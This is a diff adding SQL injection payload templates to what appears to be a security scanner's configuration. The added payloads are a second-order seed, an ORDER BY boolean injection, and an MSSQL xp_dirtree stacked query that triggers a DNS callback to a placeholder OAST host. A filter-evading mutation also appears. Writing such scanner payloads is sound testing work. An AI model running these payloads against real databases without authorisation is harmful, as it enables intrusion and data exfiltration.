@@ -35,6 +35,18 @@ payloads:
     template: "{param}' /* {canary} */ -- -"
     confidence: confirmed
     notes: Inline canary marker; OAST collector correlates the {canary} token.
+  - id: second_order_store
+    template: "{param}admin'--"
+    confidence: suspected
+    notes: Second-order SQLi seed; store this value (username/profile field) and confirm it fires on later retrieval (admin search, digest job), not on the initial write.
+  - id: orderby_boolean_case
+    template: "{param} (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)"
+    confidence: suspected
+    notes: ORDER BY / GROUP BY clause boolean injection; the un-parameterizable sort column forces a differential error on the multi-row subquery when the condition is true.
+  - id: oast_mssql_dirtree
+    template: "{param}'; EXEC master..xp_dirtree '\\\\{oast_host}\\{canary}'--"
+    confidence: confirmed
+    notes: MSSQL OOB exfil via xp_dirtree UNC-path lookup; DNS callback to {oast_host} proves execution independent of timing-based noise.
 mutations:
   - name: case_flip
     description: SQL keywords are case-insensitive; flips defeat substring filters.
